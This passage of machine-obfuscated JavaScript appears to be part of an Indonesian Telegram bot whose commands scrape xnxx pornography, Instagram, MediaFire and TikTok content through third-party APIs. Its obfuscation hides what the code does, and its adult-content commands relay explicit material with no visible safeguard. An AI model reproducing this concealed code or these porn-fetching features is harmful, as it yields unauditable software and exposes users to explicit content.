_0x1ce978['nYnmf'](_0x476bfb,_0x5c109f);}catch(_0x2eb6d0){_0x1ce978[_0x240d04(0x14c4)]!==_0x1ce978['rBlNL']?_0x1ce978['hnAJD'](_0x2e2f43,_0x352908,_0x20db6b[_0x240d04(0x2b45)],_0x1ce978[_0x240d04(0x2597)]):(console['error'](_0x2eb6d0),_0x1ce978[_0x240d04(0x1f8a)](_0x476bfb,_0x240d04(0x31d)+_0x240d04(0x8b4)+'banya\x20sehi'+_0x240d04(0x1afb)+'ram\x20tidak\x20'+_0x240d04(0x555)+_0x240d04(0x2533)));}}}break;case'xnxxsearch':{if('iBXNu'!==_0x1ce978[_0x240d04(0x308)])return _0x1ce978['pbxwu'](_0x4e0e3e,'*❌\x20Gunakan'+_0x240d04(0x4d7)+_0x209dda+(_0x240d04(0x1007)+_0x240d04(0xdef))+_0x58b954+(_0x240d04(0x22b6)+_0x240d04(0x2aac)+_0x240d04(0x2296)+_0x240d04(0x247d))+_0x5c3c93[_0x240d04(0x1adb)](_0x41e40a)[_0x240d04(0x16e6)](_0x2bcf5d=>'▧\x20'+_0x2a7c4f(_0x2bcf5d))[_0x240d04(0x86e)]('\x0a'));else{if(!_0x33cfb1)return _0x476bfb(_0x240d04(0x2972)+_0x240d04(0xbb4)+(_0x1ec495+_0x3e6565)+(_0x240d04(0xb1f)+_0x240d04(0x2000)+'gunaan:\x0a`')+_0x1ce978['htDFP'](_0x1ec495,_0x3e6565)+'\x20msbrewc`');try{_0x1ce978[_0x240d04(0x2473)](_0x476bfb,lang['wait']);let _0x11340c=await fetch('https://ap'+_0x240d04(0x23d6)+_0x240d04(0x6d0)+'rch/xnxx?q'+'='+_0x33cfb1),_0xd9d0cb=await _0x11340c[_0x240d04(0x1314)]();const _0x1dbdd0=_0xd9d0cb[_0x240d04(0x17dd)],_0x45a992=_0x1dbdd0[Math[_0x240d04(0xf02)](_0x1ce978['vHSVP'](Math[_0x240d04(0x24f1)](),_0x1dbdd0[_0x240d04(0x2b45)]))];let _0x383644='';for(let _0x57009c in _0x1dbdd0){_0x383644+='*'+_0x1dbdd0[_0x57009c][_0x240d04(0x2016)]+_0x240d04(0x25c1)+_0x1dbdd0[_0x57009c][_0x240d04(0x96e)]+'*';}await _0x1ce978[_0x240d04(0x257e)](_0x476bfb,_0x383644);}catch(_0x32c1ad){_0x1ce978[_0x240d04(0x1678)](_0x476bfb,_0x240d04(0x31d)+_0x240d04(0x8b4)+_0x240d04(0x1de8)+_0x240d04(0x1afb)+_0x240d04(0x1159)+_0x240d04(0x555)+_0x240d04(0x4cf)+_0x32c1ad+'.');}}}break;case _0x1ce978[_0x240d04(0xad0)]:{if(_0x1ce978[_0x240d04(0x23e5)]!==_0x1ce978[_0x240d04(0x29cd)]){if(!_0x483c03[0x0])return _0x476bfb(_0x240d04(0x2972)+_0x240d04(0x174)+_0x1ce978['AneAZ'](_0x1ec495,_0x3e6565)+(_0x240d04(0x2100)+_0x240d04(0x11e6)+_0x240d04(0xf36)+'tuk\x20mencar'+_0x240d04(0xb6)));const _0x3af216=_0x483c03[0x0];if(!/xnxx\.com/['test'](_0x3af216))return _0x476bfb('Link\x20tidak'+'\x20valid.');let _0x52396b=await _0x1ce978[_0x240d04(0x1cf4)](fetch,_0x240d04(0x25fb)+_0x240d04(0x23d6)+'.my.id/dow'+_0x240d04(0x2086)+_0x240d04(0x22c1)+_0x3af216),_0x3a06fc=await _0x52396b['json'](),_0x8c3868=_0x3a06fc[_0x240d04(0x17dd)],_0x4c0bab=_0x8c3868[_0x240d04(0x15a9)];_0x23c0de[_0x240d04(0x261a)+_0x240d04(0x1da4)]({'url':_0x4c0bab[_0x240d04(0x6c5)]},{'caption':lang['ok'],'parse_mode':_0x1ce978[_0x240d04(0x1117)],'reply_markup':{'inline_keyboard':[[{'text':'DELETE\x20🚯','callback_data':_0x1ce978['qBrNx']('pepek\x20',_0x83219d)}]]}});}else _0xe92c0b[_0x59a78b]&&_0x1ce978[_0x240d04(0x8ef)](_0x3eead2[_0x240d04(0x104e)]()-_0x457118[_0x38bcf7][_0x240d04(0x1e3f)],0x7530)&&(_0x1ce978[_0x240d04(0x247e)](_0x5311d6,_0x240d04(0xb17)+'bis!\x20Jawab'+_0x240d04(0x26d4)+_0x1ce978['CREVV'](_0x253eb8,_0x3d0641)+'*'),delete _0x2ee36f[_0x5832e8]);}break;case'ig':{if(_0x1ce978['Wkuoz']===_0x240d04(0xd9c)){if(!_0x483c03[0x0])return _0x1ce978[_0x240d04(0x24f5)](_0x476bfb,_0x240d04(0x2972)+_0x240d04(0x174)+_0x1ce978[_0x240d04(0x1e77)](_0x1ec495,_0x3e6565)+_0x240d04(0xa6c));const _0x325c4c=_0x483c03[0x0];if(!/instagram\.com/[_0x240d04(0x1dc7)](_0x325c4c))return _0x1ce978[_0x240d04(0x2a98)](_0x476bfb,_0x1ce978['ayWtF']);try{_0x476bfb(lang[_0x240d04(0x172a)]||_0x240d04(0x2035)+'\x20dari\x20Inst'+_0x240d04(0x204b));const {isVideo:_0x256f68,caption:_0x357128,username:_0x5ed7d3,links:_0x1f3246}=await _0x1ce978['yLIdZ'](igNekorinn,_0x325c4c),_0x31d6ae=_0x1ce978[_0x240d04(0xddb)](_0x240d04(0x15a1)+_0x5ed7d3,_0x357128?'\x0a\x0a'+_0x357128:'');for(const _0x40ae8d of _0x1f3246){_0x256f68?await _0x23c0de['replyWithV'+'ideo']({'url':_0x40ae8d},{'caption':_0x31d6ae}):_0x1ce978[_0x240d04(0x2eed)]===_0x1ce978[_0x240d04(0x2eed)]?await _0x23c0de[_0x240d04(0x2705)+_0x240d04(0x39a)]({'url':_0x40ae8d},{'caption':_0x31d6ae}):_0x1bf17e['replyWithP'+_0x240d04(0x39a)]({'url':_0x3af80b},{'caption':_0x3b32a1['ok']});}}catch(_0x418f7f){_0x1ce978['NAsDq'](_0x1ce978[_0x240d04(0x1250)],_0x1ce978['pgOos'])?_0x3fbff2[_0x240d04(0x22b5)+'ync'](_0x156e1b,_0x27bf5d[_0x240d04(0x1cf5)]([],null,0x2)):(console[_0x240d04(0x15e)](_0x418f7f),_0x1ce978[_0x240d04(0xad6)](_0x476bfb,_0x1ce978[_0x240d04(0x1971)](_0x1ce978[_0x240d04(0x21af)],_0x418f7f[_0x240d04(0x960)])));}}else _0x1ce978[_0x240d04(0x1ba)](_0x56a5e7,_0x1e74e3,_0x4d0d26[_0x240d04(0x2b45)],_0x1ce978[_0x240d04(0x2a3c)]);}break;case _0x1ce978[_0x240d04(0xf4e)]:case _0x1ce978['GdZGJ']:{if(_0x1ce978[_0x240d04(0x21e4)](_0x1ce978['YXwOL'],_0x1ce978['YXwOL']))return _0x4dea3e(_0x1ce978[_0x240d04(0x17c4)]);else{if(!_0x33cfb1)return _0x1ce978[_0x240d04(0x2d07)](_0x476bfb,'Kirim\x20peri'+_0x240d04(0xbb4)+(_0x1ec495+_0x3e6565)+(_0x240d04(0xb1f)+_0x240d04(0x2000)+'gunaan:\x0a`')+_0x1ce978[_0x240d04(0x442)](_0x1ec495,_0x3e6565)+_0x240d04(0xc6b));_0x1ce978['XJxKk'](_0x476bfb,lang[_0x240d04(0x172a)]);const _0x3f524b=await _0x1ce978[_0x240d04(0x17d7)](fetch,'https://ap'+_0x240d04(0x2c77)+'my.id/api/'+_0x240d04(0x2d67)+_0x240d04(0x25d7)+_0x33cfb1);if(!_0x3f524b['ok'])throw new Error(_0x240d04(0x1b14)+_0x3f524b['status']);const _0x4235e0=await _0x3f524b[_0x240d04(0x1314)]();if(!_0x4235e0||!_0x4235e0[_0x240d04(0x2bb6)]||!Array[_0x240d04(0x1a7e)](_0x4235e0[_0x240d04(0x2bb6)])||_0x1ce978[_0x240d04(0x448)](_0x4235e0[_0x240d04(0x2bb6)]['length'],0x0))return _0x1ce978['ClrFl'](_0x476bfb,_0x1ce978[_0x240d04(0x6b7)]);const _0x256d98=_0x4235e0[_0x240d04(0x2bb6)],_0x5f18b4=_0x256d98[Math[_0x240d04(0xf02)](_0x1ce978['ZmwSz'](Math[_0x240d04(0x24f1)](),_0x256d98[_0x240d04(0x2b45)]))];if(!_0x5f18b4||!_0x5f18b4['image_url'])return _0x476bfb(_0x1ce978[_0x240d04(0x46f)]);_0x23c0de['replyWithP'+_0x240d04(0x39a)]({'url':_0x5f18b4[_0x240d04(0x1895)]},{'caption':lang['ok'],'parse_mode':_0x1ce978[_0x240d04(0x1117)],'reply_markup':{'inline_keyboard':[[{'text':_0x1ce978['igAJU'],'callback_data':_0x1ce978[_0x240d04(0xa84)]+_0x83219d}]]}});}}break;case'mf':case _0x1ce978['MOgxi']:{if(_0x1ce978[_0x240d04(0x332)](_0x240d04(0xff3),_0x1ce978[_0x240d04(0x1488)]))return _0x1ce978[_0x240d04(0x2418)](_0x4a7e2b,_0x240d04(0x14f0)+'ang\x20dipenj'+_0x240d04(0x13c8)+_0x240d04(0xd01)+_0x240d04(0xea7)+_0x240d04(0x156f)+_0x240d04(0x254)+'ar.');else{if(!_0x483c03[0x0])return _0x1ce978[_0x240d04(0x1ab5)](_0x476bfb,_0x240d04(0x2972)+_0x240d04(0xbb4)+_0x1ce978[_0x240d04(0x2968)](_0x1ec495,_0x3e6565)+(_0x240d04(0x26a2)+_0x240d04(0x1b44)+_0x240d04(0x1f79)+'unaan:\x0a`')+_0x1ce978[_0x240d04(0x24ba)](_0x1ec495,_0x3e6565)+(_0x240d04(0xa8c)+_0x240d04(0x105f)+'re.com/fil'+_0x240d04(0x8b8)+_0x240d04(0x1f7d)+_0x240d04(0x1dfc)+_0x240d04(0xf67)+_0x240d04(0x146c)+_0x240d04(0x281d)));if(!_0x1ce978[_0x240d04(0x1a2c)](_0x3de959,_0x483c03[0x0])&&!_0x483c03[0x0][_0x240d04(0x55c)](_0x1ce978[_0x240d04(0x240)]))return _0x1ce978[_0x240d04(0x2ee4)](_0x476bfb,_0x240d04(0x2972)+'ntah:\x0a`'+_0x1ce978[_0x240d04(0x2968)](_0x1ec495,_0x3e6565)+('\x20link\x20Medi'+_0x240d04(0x21d7)+_0x240d04(0x1f79)+_0x240d04(0x2a75))+_0x1ce978[_0x240d04(0xc1d)](_0x1ec495,_0x3e6565)+(_0x240d04(0xa8c)+_0x240d04(0x105f)+_0x240d04(0x16b7)+_0x240d04(0x8b8)+'oz7ok3h/nd'+'ikzbot-Mdv'+_0x240d04(0xf67)+_0x240d04(0x146c)+'file`'));_0x476bfb(lang[_0x240d04(0x172a)]);let _0x551b38=await _0x1ce978['SJMbw'](fetch,_0x240d04(0x25fb)+'i.siputzx.'+'my.id/api/'+'d/mediafir'+_0x240d04(0x428)+_0x483c03[0x0]);if(!_0x551b38['ok'])throw await _0x551b38[_0x240d04(0x1d8c)]();let _0x30fcba=await _0x551b38[_0x240d04(0x1314)](),_0xc5cb31=_0x30fcba['data'];_0x23c0de[_0x240d04(0x1116)+_0x240d04(0xaa2)]({'url':_0xc5cb31[_0x240d04(0xc0c)+'nk'],'filename':_0xc5cb31[_0x240d04(0x13fc)]},{'caption':lang['ok'],'parse_mode':_0x1ce978['luyTT'],'reply_markup':{'inline_keyboard':[[{'text':_0x1ce978[_0x240d04(0x19de)],'callback_data':_0x240d04(0x147c)+_0x83219d}]]}});}}break;case _0x1ce978[_0x240d04(0x25a1)]:case'tiktok':{if(!_0x483c03[0x0])return _0x1ce978[_0x240d04(0x1c41)](_0x476bfb,_0x240d04(0x2972)+_0x240d04(0xbb4)+_0x1ce978['NzsPU'](_0x1ec495,_0x3e6565)+('\x20link\x20tikt'+_0x240d04(0x618)+_0x240d04(0x97b)+_0x240d04(0x2816)+'`')+_0x1ce978[_0x240d04(0x24ee)](_0x1ec495,_0x3e6565)+('\x20https://w'+_0x240d04(0x2128)+_0x240d04(0x1206)+_0x240d04(0xa3c)+_0x240d04(0x239c)+_0x240d04(0x1ca9)+_0x240d04(0x162b)+_0x240d04(0x97a)+_0x240d04(0xb48)+_0x240d04(0x2eb5)+'ID&mid=720'+_0x240d04(0x274)+_0x240d04(0x24be)+_0x240d04(0x26e4)+_0x240d04(0xed4)+'d&_d=e0cah'+_0x240d04(0x1d98)+_0x240d04(0x5da)+_0x240d04(0x2e4)+_0x240d04(0x2b94)+'355&source'+_0x240d04(0x20e6)+_0x240d04(0x162)+_0x240d04(0x16cb)+'7148061777'+_0x240d04(0x2767)+_0x240d04(0x1de5)+_0x240d04(0x118c)+_0x240d04(0x1b76)+'fP2YD-R-gq'+_0x240d04(0x810)+'qr_53pA6RK'+_0x240d04(0xe9e)+'OGrLDiVRna'+_0x240d04(0x1ba0)+'tm_source='+'copy&utm_c'+_0x240d04(0x1faa)+_0x240d04(0x9be)+_0x240d04(0xa66)+_0x240d04(0x1fc3)+_0x240d04(0x185b)+_0x240d04(0x426)+_0x240d04(0x275b)+'share_link'+'_id=6b2fea'+'89-b038-49'+_0x240d04(0x11e)+_0x240d04(0x1445)+_0x240d04(0xde9)+_0x240d04(0x2957)+_0x240d04(0xa1a)+_0x240d04(0x6eb)+_0x240d04(0x463)+_0x240d04(0x243e)));if(!_0x3de959(_0x483c03[0x0])&&!_0x483c03[0x0][_0x240d04(0x55c)](_0x1ce978[_0x240d04(0x178a)]))return _0x1ce978[_0x240d04(0x1899)](_0x476bfb,_0x240d04(0x2972)+_0x240d04(0xbb4)+_0x1ce978[_0x240d04(0x10a2)](_0x1ec495,_0x3e6565)+(_0x240d04(0xbbf)+_0x240d04(0x618)+_0x240d04(0x97b)+_0x240d04(0x2816)+'`')+_0x1ce978['WtimS'](_0x1ec495,_0x3e6565)+(_0x240d04(0xa8c)+'ww.tiktok.'+_0x240d04(0x1206)+_0x240d04(0xa3c)+_0x240d04(0x239c)+_0x240d04(0x1ca9)+'44003355?_'+_0x240d04(0x97a)+_0x240d04(0xb48)+_0x240d04(0x2eb5)+_0x240d04(0x27fa)+_0x240d04(0x274)+_0x240d04(0x24be)+_0x240d04(0x26e4)+_0x240d04(0xed4)+'d&_d=e0cah'+_0x240d04(0x1d98)+_0x240d04(0x5da)+'_id=721022'+_0x240d04(0x2b94)+_0x240d04(0x1a9d)+_0x240d04(0x20e6)+_0x240d04(0x162)+_0x240d04(0x16cb)+'7148061777'+_0x240d04(0x2767)+_0x240d04(0x1de5)+_0x240d04(0x118c)+_0x240d04(0x1b76)+'fP2YD-R-gq'+_0x240d04(0x810)+_0x240d04(0x1c75)+_0x240d04(0xe9e)+'OGrLDiVRna'+_0x240d04(0x1ba0)+_0x240d04(0x2b4b)+_0x240d04(0x2c7f)+'ampaign=cl'+'ient_share'+_0x240d04(0xa66)+'m=android&'+'share_iid='+_0x240d04(0x426)+_0x240d04(0x275b)+_0x240d04(0x950)+_0x240d04(0x292f)+_0x240d04(0x131d)+'19-8d58-38'+_0x240d04(0x1445)+'&share_app'+'_id=1180&u'+_0x240d04(0xa1a)+_0x240d04(0x6eb)+_0x240d04(0x463)+'b2878`'));_0x1ce978[_0x240d04(0x265)](_0x476bfb,lang[_0x240d04(0x172a)]);let _0x55c357=await _0x1ce978[_0x240d04(0xdd7)](fetch,_0x240d04(0x2bde)+'w.tikwm.co'+_0x240d04(0x12cb)+'='+_0x483c03[0x0]);var _0x172064=await _0x55c357[_0x240d04(0x1314)](),_0x172064=_0x172064['data'];if(_0x172064[_0x240d04(0x134d)])for(let _0x5114cd of _0x172064[_0x240d04(0x134d)]){_0x1ce978[_0x240d04(0x29a8)](_0x1ce978[_0x240d04(0x190b)],_0x1ce978[_0x240d04(0x190b)])?_0x23c0de[_0x240d04(0x2705)+_0x240d04(0x39a)]({'url':_0x5114cd},{'caption':lang['ok']}):(_0x2d4bb0[_0x240d04(0x15e)](_0x11f65d),_0x1ce978[_0x240d04(0xb7b)](_0x5df68f,_0x1ce978[_0x240d04(0x2e63)]));}else _0x172064[_0x240d04(0x70c)]&&_0x23c0de[_0x240d04(0x261a)+_0x240d04(0x1da4)]({'url':_0x172064[_0x240d04(0x70c)]},{'caption':_0x172064[_0x240d04(0x2016)]});_0x23c0de[_0x240d04(0x1566)+'udio']({'url':_0x172064[_0x240d04(0x1251)],'filename':_0x1ce978[_0x240d04(0x24c2)]});}break;case _0x1ce978[_0x240d04(0x1c7)]:{if(!_0x483c03[0x0])return _0x1ce978[_0x240d04(0x1ae8)](_0x476bfb,'Kirim\x20peri'+_0x240d04(0xbb4)+(_0x1ec495+_0x3e6565)+('\x20link\x20tikt'+_0x240d04(0x618)+'\x0aContoh\x20pe'+_0x240d04(0x2816)+'`')+_0x1ce978[_0x240d04(0x18b8)](_0x1ec495,_0x3e6565)+('\x20https://w'+_0x240d04(0x2128)+'com/@Ndikz'+_0x240d04(0xa3c)+_0x240d04(0x239c)+'2102294397'+_0x240d04(0x162b)+_0x240d04(0x97a)+_0x240d04(0xb48)+_0x240d04(0x2eb5)+_0x240d04(0x27fa)+_0x240d04(0x274)+_0x240d04(0x24be)+_0x240d04(0x26e4)+_0x240d04(0xed4)+'d&_d=e0cah'+_0x240d04(0x1d98)+_0x240d04(0x5da)+_0x240d04(0x2e4)+'9439744003'+_0x240d04(0x1a9d)+_0x240d04(0x20e6)+_0x240d04(0x162)+_0x240d04(0x16cb)+_0x240d04(0x252b)+_0x240d04(0x2767)+_0x240d04(0x1de5)+_0x240d04(0x118c)+'AAAA50SieL'+_0x240d04(0x17f8)+_0x240d04(0x810)+'qr_53pA6RK'+_0x240d04(0xe9e)+'OGrLDiVRna'+_0x240d04(0x1ba0)+'tm_source='+'copy&utm_c'+_0x240d04(0x1faa)+'ient_share'+_0x240d04(0xa66)+_0x240d04(0x1fc3)+'share_iid='+_0x240d04(0x426)+_0x240d04(0x275b)+_0x240d04(0x950)+_0x240d04(0x292f)+_0x240d04(0x131d)+_0x240d04(0x11e)+_0x240d04(0x1445)+'&share_app'+_0x240d04(0x2957)+'gbiz_name='+_0x240d04(0x6eb)+_0x240d04(0x463)+_0x240d04(0x243e)));if(!_0x3de959(_0x483c03[0x0])&&!_0x483c03[0x0][_0x240d04(0x55c)](_0x240d04(0x939)))return _0x1ce978[_0x240d04(0x342)](_0x476bfb,'Kirim\x20peri'+'ntah:\x0a`'+_0x1ce978[_0x240d04(0x413)](_0x1ec495,_0x3e6565)+('\x20link\x20tikt'+'ok\x20video`\x0a'+'\x0aContoh\x20pe'+_0x240d04(0x2816)+'`')+_0x1ce978[_0x240d04(0xb0a)](_0x1ec495,_0x3e6565)+(_0x240d04(0xa8c)+'ww.tiktok.'+_0x240d04(0x1206)+'One.offici'+'al/video/7'+_0x240d04(0x1ca9)+_0x240d04(0x162b)+'r=1&u_code'+'=e44201c8b'+_0x240d04(0x2eb5)+_0x240d04(0x27fa)+_0x240d04(0x274)+_0x240d04(0x24be)+_0x240d04(0x26e4)+'language=i'+_0x240d04(0x40e)+_0x240d04(0x1d98)+'share_item'+_0x240d04(0x2e4)+_0x240d04(0x2b94)+_0x240d04(0x1a9d)+_0x240d04(0x20e6)+_0x240d04(0x162)+'1&user_id='+'7148061777'+_0x240d04(0x2767)+_0x240d04(0x1de5)+_0x240d04(0x118c)+_0x240d04(0x1b76)+_0x240d04(0x17f8)+'SE3svcPxaP'+_0x240d04(0x1c75)+_0x240d04(0xe9e)+_0x240d04(0x1961)+'jBVglVIk&u'+_0x240d04(0x2b4b)+_0x240d04(0x2c7f)+'ampaign=cl'+_0x240d04(0x9be)+_0x240d04(0xa66)+_0x240d04(0x1fc3)+_0x240d04(0x185b)+_0x240d04(0x426)+_0x240d04(0x275b)+_0x240d04(0x950)+_0x240d04(0x292f)+'89-b038-49'+_0x240d04(0x11e)+_0x240d04(0x1445)+_0x240d04(0xde9)+_0x240d04(0x2957)+'gbiz_name='+'Main&ug_bt'+'m=b8727%2C'+'b2878`'));_0x1ce978[_0x240d04(0x26c6)](_0x476bfb,lang[_0x240d04(0x172a)]);let _0x5ea2a0=await _0x1ce978[_0x240d04(0x7d3)](fetch,_0x240d04(0x2bde)+_0x240d04(0x276b)+'m/api/?url'+'='+_0x483c03[0x0]);var _0x172064=await _0x5ea2a0[_0x240d04(0x1314)](),_0x172064=_0x172064[_0x240d04(0x2bb6)];_0x23c0de[_0x240d04(0x1566)+'udio']({'url':_0x172064[_0x240d04(0x1251)],'filename':_0x1ce978[_0x240d04(0x24c2)]});}break;case _0x1ce978[_0x240d04(0x2da1)]:{if(_0x1ce978[_0x240d04(0x999)]!==_0x240d04(0x226f))_0x275d27(()=>_0x316158(_0x240d04(0x5a8)+_0x240d04(0x2074)+_0x240d04(0x2cb)+_0x240d04(0x1851)+_0x240d04(0x1f97)+'ggaran!\x20Gu'+_0x240d04(0x1f75)+_0x240d04(0x2431)+_0x240d04(0x2d8b)),0x7530);else{if(!_0x33cfb1)return _0x1ce978[_0x240d04(0x13a6)](_0x476bfb,_0x240d04(0x2972)+'ntah:\x0a`'+(_0x1ec495+_0x3e6565)+(_0x240d04(0xd93)+_0x240d04(0x13ff)+_0x240d04(0x1d12)+_0x240d04(0x2ee2))+_0x1ce978[_0x240d04(0x2a59)](_0x1ec495,_0x3e6565)+(_0x240d04(0x284)+_0x240d04(0x3e7)));if(!_0x33cfb1['includes']('|'))return _0x1ce978[_0x240d04(0x6d8)](_0x476bfb,_0x240d04(0x2972)+_0x240d04(0xbb4)+_0x1ce978[_0x240d04(0x288e)](_0x1ec495,_0x3e6565)+(_0x240d04(0xd93)+'es`\x0a\x0aConto'+_0x240d04(0x1d12)+_0x240d04(0x2ee2))+_0x1ce978[_0x240d04(0x1e77)](_0x1ec495,_0x3e6565)+('\x20NdikzOne|'+_0x240d04(0x3e7)));var _0x4e7bb1=_0x483c03[_0x240d04(0x86e)]('\x20');atas=_0x4e7bb1[_0x240d04(0x1c39)]('|')[0x0],bawah=_0x4e7bb1['split']('|')[0x1];const _0x533c3d=[_0x1ce978[_0x240d04(0x2baf)],_0x1ce978[_0x240d04(0x1c70)],_0x240d04(0x2e7a),_0x1ce978[_0x240d04(0xbed)],_0x1ce978[_0x240d04(0x2e6d)],'riven-8',_0x1ce978['HmDma'],_0x240d04(0x16ba),_0x240d04(0x208c),'qiyana-5','renataglas'+'c',_0x1ce978['qZbiM'],_0x1ce978['MfsDw'],_0x1ce978[_0x240d04(0x5f1)],_0x1ce978[_0x240d04(0x2df8)],_0x1ce978[_0x240d04(0x2894)],_0x1ce978[_0x240d04(0x1b1)],_0x1ce978[_0x240d04(0x2445)],_0x1ce978[_0x240d04(0x74a)],_0x1ce978[_0x240d04(0x1cce)],_0x1ce978['oOrPh'],_0x1ce978['bGlqQ'],_0x1ce978[_0x240d04(0x116e)],_0x1ce978[_0x240d04(0x1d9d)],_0x1ce978[_0x240d04(0x1e5f)],_0x1ce978['iybJp'],_0x1ce978['GFgGL'],_0x1ce978['mQASu'],_0x1ce978[_0x240d04(0x1b2b)],_0x1ce978[_0x240d04(0x2e4b)],_0x1ce978[_0x240d04(0x24fd)],_0x1ce978[_0x240d04(0x8d1)],_0x1ce978[_0x240d04(0x1840)],_0x1ce978[_0x240d04(0xe78)],_0x1ce978[_0x240d04(0x2664)],_0x1ce978['LYziy'],_0x1ce978[_0x240d04(0x581)],_0x240d04(0x195a),_0x1ce978[_0x240d04(0x1584)],'nalzahar-4',_0x1ce978['JhBCO'],_0x1ce978[_0x240d04(0x235f)],_0x1ce978[_0x240d04(0x2814)],_0x240d04(0x189f),_0x1ce978[_0x240d04(0x137a)],_0x240d04(0x1111),_0x1ce978[_0x240d04(0x89d)],_0x1ce978[_0x240d04(0x16b1)],_0x1ce978[_0x240d04(0x134f)],_0x240d04(0x2358),_0x240d04(0x19e8),_0x1ce978[_0x240d04(0x997)],_0x240d04(0x1d2c),_0x1ce978[_0x240d04(0x1fea)],'caitlyn-10',_0x1ce978[_0x240d04(0x1239)],_0x240d04(0x1c7b),_0x240d04(0x167e),_0x1ce978[_0x240d04(0x14f3)],_0x1ce978[_0x240d04(0x502)],_0x240d04(0x858),_0x240d04(0x186d),_0x1ce978[_0x240d04(0x140f)],_0x1ce978[_0x240d04(0x1b80)],_0x1ce978[_0x240d04(0x2da2)],_0x1ce978[_0x240d04(0x14df)],_0x1ce978[_0x240d04(0xd70)],_0x1ce978[_0x240d04(0x1cbd)],_0x240d04(0xd9),_0x1ce978['zMnWa'],_0x1ce978[_0x240d04(0x2eda)],_0x1ce978['BxRcp'],_0x1ce978[_0x240d04(0x12fd)],_0x1ce978[_0x240d04(0xc61)],_0x1ce978['heqdM'],_0x1ce978['MhVsW'],_0x1ce978[_0x240d04(0x1110)],_0x1ce978[_0x240d04(0x2236)],_0x1ce978[_0x240d04(0x2404)],_0x240d04(0x2391),_0x1ce978[_0x240d04(0x23d9)],_0x1ce978[_0x240d04(0x3c9)],_0x1ce978['Qerbg'],'graves-6','seraphine-'+'5',_0x240d04(0x20c8),_0x1ce978[_0x240d04(0x2b36)],_0x1ce978['QBCtf'],_0x1ce978[_0x240d04(0x25e2)],_0x1ce978[_0x240d04(0x1304)],_0x1ce978[_0x240d04(0x2b43)],_0x1ce978[_0x240d04(0x343)],'evelynn-6',_0x240d04(0x2bf),_0x240d04(0x14dc),_0x1ce978['Oyeew'],_0x1ce978['bGQQu'],_0x240d04(0xad2),_0x240d04(0x2de5)+_0x240d04(0x1bd7),_0x1ce978['EJOTi'],_0x240d04(0x255),_0x240d04(0x1cee),_0x1ce978[_0x240d04(0x170b)],_0x1ce978[_0x240d04(0x11a9)],_0x1ce978['IdHlI'],_0x1ce978[_0x240d04(0xab1)],_0x240d04(0x1129),_0x1ce978[_0x240d04(0x1b8)],_0x1ce978[_0x240d04(0x205a)],_0x1ce978[_0x240d04(0x195b)],_0x240d04(0x278a),_0x240d04(0x276a),_0x1ce978['Bljbp'],_0x240d04(0x302),_0x1ce978[_0x240d04(0x2115)],_0x1ce978['fNRAt'],_0x1ce978[_0x240d04(0xa32)],_0x1ce978[_0x240d04(0x2298)],_0x1ce978['CaaSO'],_0x1ce978['mZsHc'],_0x240d04(0x127b),'sylas-4',_0x1ce978[_0x240d04(0x1fce)],_0x1ce978['qIKpq'],_0x1ce978[_0x240d04(0x1baa)],_0x240d04(0x328),_0x1ce978[_0x240d04(0x1440)],_0x1ce978['jeJCx'],_0x240d04(0x18be),_0x1ce978[_0x240d04(0x13d5)],_0x1ce978[_0x240d04(0x89c)],_0x240d04(0x1331),_0x1ce978[_0x240d04(0x2575)],_0x240d04(0x13ed),_0x1ce978[_0x240d04(0x1592)],_0x240d04(0x1a8a),_0x1ce978['yPmum'],_0x1ce978[_0x240d04(0xb38)],_0x1ce978[_0x240d04(0x816)],_0x1ce978[_0x240d04(0x120d)],_0x1ce978[_0x240d04(0xbb9)],_0x1ce978['HFUiv'],_0x1ce978['fSLST'],'aphelios-2',_0x1ce978['vdvlY'],'caitlyn-5',_0x240d04(0x969),_0x1ce978['rAJQM'],_0x1ce978[_0x240d04(0x27f5)],_0x1ce978['zwgGz'],_0x1ce978[_0x240d04(0x1e08)],'wukong-4',_0x1ce978[_0x240d04(0x2981)],_0x240d04(0x27af),_0x1ce978[_0x240d04(0x2156)],_0x1ce978[_0x240d04(0xf3a)],_0x1ce978[_0x240d04(0x675)],_0x1ce978['OjAMc'],_0x1ce978['vfMhy'],_0x1ce978[_0x240d04(0xffb)],_0x1ce978[_0x240d04(0x2c72)],_0x1ce978[_0x240d04(0x248b)],_0x1ce978[_0x240d04(0xda0)],_0x1ce978[_0x240d04(0x2c8)],_0x1ce978[_0x240d04(0x1a4b)],_0x1ce978[_0x240d04(0xd85)],_0x1ce978[_0x240d04(0xddd)],_0x1ce978[_0x240d04(0x1515)],_0x1ce978[_0x240d04(0x1cc0)],_0x240d04(0x17d),_0x1ce978[_0x240d04(0x1679)],'katarina-6',_0x240d04(0xeb1),_0x1ce978[_0x240d04(0xd97)],_0x1ce978[_0x240d04(0xfa5)],_0x1ce978[_0x240d04(0x1898)],_0x240d04(0x425),'anivia-3',_0x240d04(0x2d03),_0x1ce978[_0x240d04(0x2b5)],_0x1ce978[_0x240d04(0x21da)],_0x240d04(0x1186)+'3',_0x1ce978[_0x240d04(0x1890)],_0x1ce978[_0x240d04(0x28a9)],'nidalee-5',_0x1ce978[_0x240d04(0x995)],_0x1ce978['wfwgr'],_0x1ce978[_0x240d04(0xb15)],_0x1ce978['NkrqW'],_0x1ce978[_0x240d04(0x264)],_0x1ce978['yfJpZ'],_0x1ce978[_0x240d04(0xf17)],_0x240d04(0x1902),_0x1ce978['qUHEc'],_0x1ce978['dTBcJ'],_0x240d04(0x2be7),_0x1ce978[_0x240d04(0x2e92)],_0x240d04(0xef5),_0x1ce978[_0x240d04(0x16d6)],_0x240d04(0x1713),_0x1ce978[_0x240d04(0x1a59)],_0x240d04(0x2585)+'3',_0x1ce978[_0x240d04(0x2385)],_0x1ce978[_0x240d04(0x1c27)],_0x1ce978[_0x240d04(0x14b3)],_0x240d04(0x1222),_0x240d04(0x11c),_0x1ce978['tMHFr'],_0x1ce978[_0x240d04(0x2435)],_0x1ce978['UEYFP'],_0x1ce978[_0x240d04(0x10e9)],_0x1ce978[_0x240d04(0x13de)],_0x1ce978['SgMqH'],_0x1ce978[_0x240d04(0x265f)],_0x1ce978[_0x240d04(0x1870)],_0x1ce978[_0x240d04(0xc18)],_0x240d04(0x1f89),_0x240d04(0x28c6),_0x1ce978[_0x240d04(0x179c)],_0x1ce978[_0x240d04(0xd7a)],_0x1ce978['voAWI'],_0x1ce978[_0x240d04(0x2956)],_0x1ce978[_0x240d04(0x183c)],_0x1ce978[_0x240d04(0x2d46)],_0x1ce978['KfBZN'],_0x1ce978[_0x240d04(0x1805)],_0x240d04(0x19d2),_0x1ce978['HlyBD'],_0x1ce978['aCoXo'],_0x1ce978[_0x240d04(0x2514)],_0x240d04(0